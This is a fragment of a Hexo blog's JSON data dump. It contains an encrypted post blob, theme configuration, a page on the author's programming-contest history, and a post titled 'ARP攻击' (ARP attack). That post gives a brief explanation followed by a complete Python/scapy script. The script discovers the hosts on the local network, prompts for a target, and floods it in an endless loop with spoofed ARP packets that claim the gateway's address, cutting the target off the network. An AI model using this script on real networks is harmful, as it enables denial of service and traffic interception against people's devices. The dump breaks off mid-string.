1edd25cd3729b85675bc5c0d9f7e7fda2597e6b74c81c6ae87cb15a64691a27ea560e264d4eeafd6d4c51d81e8653e2313cf938eb8b6e3b028b9795c2fba3f3065ce41fb8873629fc2e7c7df1140b25b8018f362d6b7dbea3387b076813f29cf7b084600b11ea0386112acf0dde779217eaf759ee487cef39bdd1afa72b70ed13ebdfad7df1b3b0d221e3d6b38a8d38d124a4f22d803a9620d34004a625423cabf8ff9ef80674f3dffcc215923ed69473ab3ac886a42f4dc112376c9a6c8a49beaa79223974d23b210251f095a0b7ea33462e4405d6c7043d5b56322b74e3af67fe3c1e47ef7fc674ba25cf1afb80ab21d3a0a93ca7a832bd80eb0964db7704c6ced384d0c8479c1f742fe42664097e0d2d75952b1f8c553557eb7c63ca73ea7704b453928852a04e67f8bbc6e703cfc3b14145a302e13a1421ad690457f84e5bc99217663e39ca98cae2bf0fb74b7b33c2c9bf6e5ebfddaadaa73dd1ced0001771f3b791985b1f8e729bd39d5127d12b481c3c630f0893c167ee201c9cab031de382e8707e6cd7053e7216e5963e0ba408e55ed749bfade41926a02d6ca2862de10d2d25df69f59eb5f1cbda0cb29aac50b62dbf8be110f44d0ce601e195e91f9116eddbd2d30df30cdc405eb7f2eb8445b2a8e4a867fdd573987a22ec3dc74b8601f9454523c86ae8a61ca8b852bef848d4a0abc1abc00c3d1201cb36d7b9c74694f9af96b9f03257fc4ff2da0d35f0805bbcb8c0403bf6601fd80fcf854f064281fcb6acb319091c4a541e71383942ecac382959d30646d2e15ea7f1f98efdadb7367fe39db4530032bd87d8478c0629d991e10e3f9ce8f76931f02a7938641cbaa2fe46ebbd9e5e9e5d9639ac7a28365d9b884ad1dca45f23206159e99f082d033f41a7e73f4ce02d0dfbb7b2e296eff4360b91be7f38c85cb48b6a3de6466ad9bf1e34d3b0958a78c48000fd1d38d45c27a0f2e1a267e06f644898582ae389bebc9853d706323604efde221f2f106260946252a0760727bbde89f423324f158ff7176106bb81736d4b7d20401d81190dce8a18d2ceb40a0de86f677437846b9fde031938ae27eb2a2de8a32577d52b39ebbec5a820a31cd1313c6d81af41df5c7fe083559c3ea15145a1346677d50e831116917796b24279350a4a5983c6d0e26c8b2abffe2a15041ed9defd5048eb7e80147c3dad26eae184b52bb473c4db019d4e9a7cfd4e0aea19fae0ee0eff9c45c58acbd2043fd48424515c59a85293ebb825429125b0092c66f92e00a5c75e3427dc2aee9e1ff57c4c2c2a70bdce2bfa915638aea504c09f519c9e7fdc41d997923bb850a9ee61302928204910f629601c6e7e9c7d70fda8e9cf1d6a33b36e07c9ea9b8d67ed790162f65fd13f54493ef6afa3b502921e45d37c3bc03f6f6a5a2c5a1dd29b1e34a89b740e4ad2fbddc296e308eccde8382d805eb342b38ab913dd4e2d10b84bcbc9723ee4d2106c099ea89d6adbe9a5ecc433b2525bf0aeb00d93e5f2c2bea7495b6d70319501012305553eee72616cf477c025a950b88b55d8b563923ffdae3e1e97603c661d269d290e7c98f04abedf33d1e1b7e206b9f7cee0e30e9543a89b70a3e67607b1cd15b47d9e9b3aef9a0232231a07fc600be584ff633eb6a1a6ce1c65d186c4a84a70f5b9ef1667df52809c7b3fd12f50979e50fc468d7c7a3dc767148ef2aea2aad366e139760d65b2f7959bcadf74c06d89658d060613a1e1b2d446599e6bcf439a1e509eaec12a7f9cb6ae3dd3f263a104cdc56edd35163b84c4c7196556895f02ab3f272cdadff36851b0063a61b845c72ece30b813f38ebb887b98d0a1d1130e6463aaa2cdf774abe706861636d92c056b9828100b943f7b2d3aa26af7f0b538482834372a4e2511dff0c422f060d7bd8945c20300084b0e8af22f3880513184de3ad8dc8fcf718a02a4019591cd78be544714b9a579ba69c5dc322f2576354094af2de3dd0b08369b10beb924ff9bd71418b8dbb50fe72ea04605ddb02fcbb2853abba582ce415af0ee552777e9dede026be2f1c8d81c39e4d6cb48b19088d0481a1d1fa15233715f1aa58f42a59827cea7a0df9f1b2dd6fe3729e4a5a9ee6d5533c585769c99989e9aeb22b91c11ca84838c3556bc679dade23b687a524e62c5aad4521acbd074a4b891fa3711397e6bbb8044a46decda85a7153e2cc6e1</script>\n</div>\n<script src=\"/lib/blog-encrypt.js\"></script><link href=\"/css/blog-encrypt.css\" rel=\"stylesheet\" type=\"text/css\">","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":847,"excerpt":"这是一篇加密文章","more":"这是一篇加密文章","origin":"<!-- \n<center><font size=5><strong>名称<br>2019/00/00</strong></font></center>\n![]()\n\n<br><br>\n\n\n---\n-->\n<p><center><font size=5><strong>河南省第十二届ACM大学生程序设计竞赛<br>2019/05/07</strong></font></center><br><img data-src=\"https://cdn.file.todest.cn/blog/photo/20190507.jpg\" alt=\"河南省第十二届ACM大学生程序设计竞赛\"><br>又一次省赛，题目被喷得厉害，$D$题虽然数据出锅了，重判了，但是简单题，写的有点晚了，$G$题一开始就开始看了，结果发现思路还是不对，$F$题写了个假贪心，随便改了顺序最后十分钟过了，五道题，貌似是第一次正式比赛写够一半题目，拿了个银奖，其实五题还是有金的，怎么说呢，有点小失望，实名羡慕 <a href=\"https://blog.wzy1999.wang/\">煜神</a>（ICPC，CCPC省赛金牌，ICPC亚洲区域赛银牌大佬）。<br>放一张伙伴们的合照纪念下，希望下次还能凑齐。</p>\n<p><img data-src=\"https://cdn.file.todest.cn/blog/photo/20190509214020.jpg\" alt=\"\"><br><br><br></p>\n<hr>\n<p><center><font size=5><strong>“卓见杯”第五届CCPC中国大学生程序设计竞赛河南省赛<br>2019/04/13</strong></font></center><br><img data-src=\"https://cdn.file.todest.cn/blog/photo/CCPC20190416103351.jpg\" alt=\"“卓见杯”第五届CCPC中国大学生程序设计竞赛河南省赛\"><br>又换队友了，这次和栓瑞、丹丹一起拿了个银牌，错失金牌（大哭），主要是$I$题我以为$M$就是 4 ，暴力一早就已经写好了，栓瑞来了句$M$不一定是 4 吧，然后我就看了下题目，瞬间懵逼，以为暴力肯定会超时，结果发现正解居然真的是暴力。错失了金牌￥500，甚至一血￥500，不过还好银牌有个充电宝。<br><br><br></p>\n<hr>\n<p><center><font size=5><strong>第四届“中国高校计算机大赛-团体程序设计天梯赛”总决赛 <br>2019/03/30</strong></font></center><br><img data-src=\"https://cdn.file.todest.cn/blog/photo/Lanqiao.jpg\" alt=\"第四届“中国高校计算机大赛-团体程序设计天梯赛”总决赛\"><br>天梯赛省二，还是太菜了啊。不好意思，拖了队伍后腿。<br><br><br></p>\n<hr>\n<p><center><font size=5><strong>ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/焦作站（本校站）<br>2018/11/25</strong></font></center><br><img data-src=\"https://cdn.file.todest.cn/blog/photo/ICPC-JiaoZuo.jpg\" alt=\"ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/焦作站（本校站）\"><br>本次比赛，我是作为志愿者出场的，全程真的是累。<br><br><br></p>\n<hr>\n<p><center><font size=5><strong>ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/徐州站<br>2018/10/27</strong></font></center><br><img data-src=\"https://cdn.file.todest.cn/blog/photo/Xuzhou.jpg\" alt=\"ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/徐州站\"></p>\n<p><table border rules=none cellspacing=0>\n    <tr>\n        <td><center><img data-src=\"https://cdn.file.todest.cn/blog/photo/IMG_20181028_141410.jpg\">鸿杰大佬</center></td>\n        <td><center><img data-src=\"https://cdn.file.todest.cn/blog/photo/IMG_20181028_155330.jpg\">他们队</center></td>\n        <td><center><img data-src=\"https://cdn.file.todest.cn/blog/photo/IMG_20181028_141619.jpg\">猛神大佬</center></td>\n    </tr>\n</table><br>徐州诶，又一次来到这个地方，上一次和猛神打铁而归，这次和煜神、行神、一个队，运气爆棚一题躺银，全程数气球。<br><br><br></p>\n<hr>\n<p><center><font size=5><strong>2018年ACM国际大学生程序设计竞赛全国邀请赛（江苏）<br>2018/06/03</strong></font></center><br><img data-src=\"https://cdn.file.todest.cn/blog/photo/2018Xuzhou.jpg\" alt=\"2018年ACM国际大学生程序设计竞赛全国邀请赛（江苏）\"><br>再次和队友出去比赛，王老师给我们定了个目标，不爆零就行，我们果然不负众望，写了两题，打了个铁。<br><br><br></p>\n<hr>\n<p><center><font size=5><strong>河南省第十一届大学生程序设计竞赛<br>2018/05/27</strong></font></center><br><img data-src=\"https://cdn.file.todest.cn/blog/photo/20180527.jpg\" alt=\"河南省第十一届大学生程序设计竞赛\"><br>和猛神，骆九一个队，拿了个铜，还行吧，反正队友挺高兴的（手动滑稽）。<br><br><br></p>\n<hr>\n<p><center><font size=5><strong>第九届软件与信息技术专业人才大赛<br>2018/04/01</strong></font></center><br><img data-src=\"https://cdn.file.todest.cn/blog/photo/20180401.jpg\" alt=\"第九届软件与信息技术专业人才大赛\"><br>比赛体验还行，就是伙食体验极差！！！<br>合照找不到了，就放一张大佬照片留作纪念。</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><br><br></h2>","encrypt":true},{"title":"标签","date":"2018-09-10T00:18:08.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2018-09-10 08:18:08\ntype: \"tags\"\ncomments: false\n---\n","updated":"2019-01-02T15:21:36.366Z","path":"tags/index.html","layout":"page","_id":"ckieexkag000gqse5cfhwhfn0","content":"","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":0,"excerpt":"","more":""}],"Post":[{"title":"ARP攻击","abbrlink":"b286d8f1","date":"2020-10-05T12:35:05.000Z","_content":"# 原理\n攻击者向局域网特定网络设备持续的发送ARP欺骗数据包，对该网络设备进行网关欺骗，使其认为网关为攻击者设备，如果攻击者不对被攻击者的网络请求进行处理的话，会造成被攻击者断网。\n\n# 代码\n\ninet为一个列表，存储发起ARP攻击要使用的网卡，分别存储网卡名称和网卡MAC地址，net为当前选中网卡序号。\nhost为一个备注字典表，键，值分别对应MAC地址和备注。\n<!--more-->\n\n```py\nfrom scapy.all import *\nimport time\n\ninet = [\n    [\"Intel(R) Dual Band Wireless-AC 3165\", \"7C:67:A2:F1:9D:2A\"],\n    [\"802.11n USB Wireless LAN Card\", \"70:F1:1C:04:8A:54\"]\n]\nhost = {\n    \"60:14:b3:ad:85:7d\": \"LiuQI's PC-eth\",\n    \"50:a0:09:d1:fb:65\": \"MiAi Sound Box\",\n    \"04:4f:4c:8e:dc:b8\": \"LiuQi's Honor 9\",\n    \"f4:30:b9:a6:0f:76\": \"Unkown\",\n    \"54:e1:ad:7c:0b:53\": \"ZhiHao's PC-eth\"\n}\nnet = 0\nwifi = inet[net][0]\nfor line in os.popen('route print'):\n    s = line.strip()\n    if s.startswith('0.0.0.0'):\n        slist = s.split()\n        ip = slist[3]\n        gw = slist[2]\n        break\nprint('GW：', gw)\nprint('IP：', ip)\ntnet = gw + '/24'\np = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=tnet)\nans, unans = srp(p, iface=wifi, timeout=5, verbose=0)\nprint(\"Total %d Host：\" % len(ans))\nresult = []\nfor s, r in ans:\n    result.append([r[ARP].psrc, r[ARP].hwsrc])\nresult.sort()\nfor index, (ip, mac) in enumerate(result):\n    print(index + 1, \": \", ip, \"\\t---->\\t\", mac, end='')\n    if not host.get(mac) == None:\n        print(\" ......\", host[mac])\n    else:\n        print()\ntarget = int(input(\"Target：\")) - 1\ntarget = result[target][0]\np1 = Ether(dst='ff:ff:ff:ff:ff:ff', src=inet[net][1]) / ARP(pdst=target, psrc=gw)\nprint(\"Processing......\")\nwhile True:\n    sendp(p1, verbose=0)\n    time.sleep(0)\n```\n","source":"_posts/ARP攻击.md","raw":"---\ntitle: ARP攻击\ncategories: 计算机网络\ntags:\n  - Python\n  - ARP\nabbrlink: b286d8f1\ndate: 2020-10-05 20:35:05\n---\n# 原理\n攻击者向局域网特定网络设备持续的发送ARP欺骗数据包，对该网络设备进行网关欺骗，使其认为网关为攻击者设备，如果攻击者不对被攻击者的网络请求进行处理的话，会造成被攻击者断网。\n\n# 代码\n\ninet为一个列表，存储发起ARP攻击要使用的网卡，分别存储网卡名称和网卡MAC地址，net为当前选中网卡序号。\nhost为一个备注字典表，键，值分别对应MAC地址和备注。\n<!--more-->\n\n```py\nfrom scapy.all import *\nimport time\n\ninet = [\n    [\"Intel(R) Dual Band Wireless-AC 3165\", \"7C:67:A2:F1:9D:2A\"],\n    [\"802.11n USB Wireless LAN Card\", \"70:F1:1C:04:8A:54\"]\n]\nhost = {\n    \"60:14:b3:ad:85:7d\": \"LiuQI's PC-eth\",\n    \"50:a0:09:d1:fb:65\": \"MiAi Sound Box\",\n    \"04:4f:4c:8e:dc:b8\": \"LiuQi's Honor 9\",\n    \"f4:30:b9:a6:0f:76\": \"Unkown\",\n    \"54:e1:ad:7c:0b:53\": \"ZhiHao's PC-eth\"\n}\nnet = 0\nwifi = inet[net][0]\nfor line in os.popen('route print'):\n    s = line.strip()\n    if s.startswith('0.0.0.0'):\n        slist = s.split()\n        ip = slist[3]\n        gw = slist[2]\n        break\nprint('GW：', gw)\nprint('IP：', ip)\ntnet = gw + '/24'\np = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=tnet)\nans, unans = srp(p, iface=wifi, timeout=5, verbose=0)\nprint(\"Total %d Host：\" % len(ans))\nresult = []\nfor s, r in ans:\n    result.append([r[ARP].psrc, r[ARP].hwsrc])\nresult.sort()\nfor index, (ip, mac) in enumerate(result):\n    print(index + 1, \": \", ip, \"\\t---->\\t\", mac, end='')\n    if not host.get(mac) == None:\n        print(\" ......\", host[mac])\n    else:\n        print()\ntarget = int(input(\"Target：\")) - 1\ntarget = result[target][0]\np1 = Ether(dst='ff:ff:ff:ff:ff:ff', src=inet[net][1]) / ARP(pdst=target, psrc=gw)\nprint(\"Processing......\")\nwhile True:\n    sendp(p1, verbose=0)\n    time.sleep(0)\n```\n","slug":"ARP攻击","published":1,"updated":"2020-10-05T13:19:16.486Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexk9z0001qse5hg70b7rw","content":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" 